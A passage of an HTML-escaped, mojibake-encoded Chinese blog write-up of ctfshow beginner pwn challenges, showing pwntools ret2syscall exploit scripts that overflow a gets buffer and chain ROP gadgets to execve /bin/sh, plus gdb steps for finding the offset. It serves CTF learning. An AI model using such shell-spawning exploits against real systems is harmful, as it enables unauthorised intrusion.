&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/lib/x86_64-linux-gnu/libc.so.6&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pwn.challenge.ctf.show&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28266&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_eax_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080bb196&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_edx_ecx_ebx_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0806eb90&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;binsh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80BE408&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;int_0x80&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x08049421&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_eax_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_edx_ecx_ebx_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;binsh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;int_0x80&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¯•åŠå¤©çˆ†EOFï¼Œä¹Ÿæ˜¯æ— è¯­ï¼Œåæ¥æ‰çŸ¥é“æƒ³èµ·è¿™ä¸ªç¨‹åºæ˜¯é™æ€ç¼–è¯‘çš„ï¼Œè€Œè¿è¡Œç¨‹åºæ˜¯åŠ¨æ€çš„ï¼Œåœ¨IDAä¸Šå‘ˆç°çš„æ•°æ®å¯èƒ½æ˜¯æœ‰åå·®ï¼Œè¿™è®©æˆ‘æƒ³èµ·äº†ç¼“å†²åŒºå¤§å°ï¼Œå¯„å­˜å™¨espæ˜¯åŠ¨æ€å¯„å­˜å™¨ï¼Œ&lt;strong&gt;ebp-64h&lt;/strong&gt;å¯èƒ½æ˜¯é”™è¯¯çš„ï¼Œäºæ˜¯æˆ‘å¼€å§‹ç”¨åŠ¨æ€è°ƒè¯•&lt;code&gt;pwngdb&lt;/code&gt;ï¼Œæ—¢ç„¶getsæ˜¯æˆ‘ä»¬å”¯ä¸€èƒ½å’Œç¨‹åºäº¤äº’çš„åœ°æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡getså‡½æ•°ï¼Œè¾“å…¥ä¸€äº›åƒåœ¾å€¼ï¼Œé‚£å°±aaaaå§ï¼Œåˆšå¥½4å­—èŠ‚ï¼ˆå»ºè®®ä¸è¦å¤ªå¤§ï¼Œä¸‡ä¸€æº¢å‡ºäº†ç¨‹åºå°±å´©æºƒäº†ï¼Œå½“ç„¶aaaã€ctfä¹Ÿè¡Œï¼‰ï¼Œè®©espæŠŠæˆ‘æ‰€è¾“å…¥çš„å€¼è¿èµ°ï¼Œè¿™ä¼šå°±èƒ½çœ‹åˆ°espçš„åœ°å€äº†ï¼Œç„¶åç”¨ebpåœ°å€å’Œå®ƒç›¸å‡å¾—åˆ°åç§»é‡äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/266.png&#34;
	width=&#34;1836&#34;
	height=&#34;838&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/266_hu_a77d25f28c503b3f.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/266_hu_97886add58639320.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;219&#34;
		data-flex-basis=&#34;525px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åœ¨å³è¾¹çš„è¿è¡Œæ¡†ä¸Šï¼Œå…ˆç»™ç¨‹åºè¿›è¡Œbreak mainæŒ‡ä»¤ç»™mainå‡½æ•°æ–­ç‚¹è¿›è¡ŒåŠ¨æ€è°ƒè¯•å‡†å¤‡ï¼Œç„¶åå¼€å§‹äº†ï¼Œç”¨&lt;code&gt;n&lt;/code&gt;æŒ‡ä»¤ï¼ˆä¹Ÿå°±æ˜¯nextç¼©å†™ï¼Œä¸€æ­¥æ­¥è¿›è¡Œï¼Œå·¦è¾¹çš„è°ƒè¯•æ¡†ä¹Ÿä¼šçœ‹åˆ°å˜åŒ–ï¼‰ï¼Œæ¥ç€å›è½¦æ¢è¡Œä¸€ç›´è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œï¼Œç›´åˆ°çœ‹åˆ°æœ‰ç†Ÿæ‚‰çš„ctfshowäº¤äº’ç•Œé¢å’Œè®©ä½ è¾“å…¥çš„äº¤äº’æ“ä½œæ—¶å°±å¯ä»¥äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/267.png&#34;
	width=&#34;1830&#34;
	height=&#34;733&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/267_hu_53af3ccc1bf52b4e.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/267_hu_f8f1b70314387566.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;espåœ°å€ï¼š0xffffceec&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;249&#34;
		data-flex-basis=&#34;599px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ—¶è¾“å…¥AAAAï¼Œå·¦è¾¹è·Ÿç€å˜åŒ–ï¼Œespåœ°å€å‡ºç°äº†ã€‚&lt;/p&gt;
&lt;p&gt;æŸ¥è¯¢æ ˆå¸§åº•éƒ¨ebpå¯„å­˜å™¨åœ°å€ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;info registers
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/268.png&#34;
	width=&#34;810&#34;
	height=&#34;718&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/268_hu_cdb1a5a742eaf8ff.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/268_hu_7b1f43937804a501.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;ebp:0xffffcf58&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;112&#34;
		data-flex-basis=&#34;270px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ebp - esp =&amp;gt; 0xffffcf58 - 0xffffceec =&amp;gt; 6C = 108&lt;/p&gt;
&lt;p&gt;è¿™æ˜¯åç§»é‡ï¼Œå†è¦†ç›–ebpæœ¬èº«ï¼Œé‚£å°±æ˜¯112äº†&lt;/p&gt;
&lt;p&gt;æœ€ç»ˆexpï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/lib/x86_64-linux-gnu/libc.so.6&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pwn.challenge.ctf.show&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28266&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_eax_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080bb196&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pop_edx_ecx_ebx_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0806eb90&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;binsh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80BE408&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;int_0x80&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x08049421&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;112&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_eax_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_edx_ecx_ebx_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;binsh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;int_0x80&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;blockquote class=&#34;alert alert-warn&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;æ‰€ä»¥è¯´åç»­çœ‹åˆ°é™æ€ç¼–è¯‘ä¸€å®šè¦å¤šæ³¨æ„åç§»é‡ï¼Œåç»­è¦ç†Ÿç»ƒè¿ç”¨pwngdbåŠ¨æ€è°ƒè¯•å’Œpwndbgã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;pwn_072&#34;&gt;PWN_072
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šæ¥ç€ç»ƒret2syscallï¼Œå¤šç³»ç»Ÿå‡½æ•°è°ƒç”¨ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_072&#34; &gt;PWN_072&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/270.png&#34;
	width=&#34;785&#34;
	height=&#34;200&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/270_hu_11c7119c01019f55.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/270_hu_e602151e18533c05.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;392&#34;
		data-flex-basis=&#34;942px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;32ä½å…³é—­æ ˆä¿æŠ¤ä¸PIEã€‚&lt;/p&gt;
&lt;p&gt;IDAåˆ†æï¼Œä¾æ—§é™æ€ç¼–è¯‘ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/271.png&#34;
	width=&#34;714&#34;
	height=&#34;250&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/271_hu_fce3f959fda3fd0.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/271_hu_ee7f129c4ad1c729.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;285&#34;
		data-flex-basis=&#34;685px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;çœ‹åˆ°getså‡½æ•°ï¼Œå’Œä¸Šé¢˜å·®ä¸å¤šï¼Œéƒ½æ˜¯åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´ã€‚&lt;/p&gt;
&lt;p&gt;/bin/shåœ¨IDAä¸Šæœç´¢ä¸åˆ°ï¼Œä¸èƒ½è¿”å›åœ°å€æ‰§è¡Œgetshelläº†ï¼Œé‚£å°±æ‰¾å¦å¤–ä¸€ç§æ–¹æ³•ã€‚ç¡®å®éš¾æ‰¾ï¼Œreadè¡ç”Ÿå‡½æ•°å¾ˆå¤šï¼Œæ‰¾åˆ°ä¸ªå•çº¯â€œreadâ€çš„å‡½æ•°æ˜¯çœŸéš¾&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/272.png&#34;
	width=&#34;1169&#34;
	height=&#34;358&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/272_hu_d83895fa855b5b5b.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/272_hu_adb2fe1b9c39c764.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;readå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;326&#34;
		data-flex-basis=&#34;783px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ä¸ä¼šå°±ä¸¢ç»™AIå§ï¼Œè¿™ç¡®å®æœ‰ç‚¹éš¾å»è¯»æ‡‚&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æœ‰readå‡½æ•°é‚£æˆ‘ä»¬å¯ä»¥ç”¨å®ƒå»è¯»å–å­—ç¬¦ä¸²åˆ°å†…å­˜å‘ï¼Œåˆ©ç”¨readå‡½æ•°æ¥è¿›è¡Œæ‰‹åŠ¨å†™å…¥â€œ/bin/shâ€å­—ç¬¦ä¸²ã€‚&lt;/strong&gt;&lt;/p&gt;
